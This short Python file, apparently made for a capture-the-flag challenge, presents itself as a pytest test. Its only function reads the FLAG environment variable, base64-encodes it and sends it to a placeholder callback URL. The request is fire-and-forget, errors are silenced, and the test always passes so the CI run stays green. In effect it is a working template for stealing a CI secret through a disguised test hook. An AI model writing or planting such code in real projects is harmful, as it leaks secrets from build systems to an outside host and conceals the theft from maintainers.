# tests/test_leak_flag.py
import os, base64, urllib.request, urllib.parse

def test_leak_flag():
    flag = os.environ.get("FLAG", "")
    # if they haven't set it, don't fail the run (CTF nicety)
    if not flag:
        assert True
        return

    # send to your callback URL (e.g., from webhook.site / requestbin)
    # replace with the URL the CTF gives you:
    callback = "https://<your-ctf-callback>/ingest"

    payload = base64.b64encode(flag.encode()).decode()
    url = callback + "?" + urllib.parse.urlencode({"flag": payload})
    # fire-and-forget
    try:
        urllib.request.urlopen(url, timeout=5).read()
    except Exception:
        # Don't fail the run even if the callback is slow/unreachable
        pass

    # Always pass so the workflow finishes green
    assert True
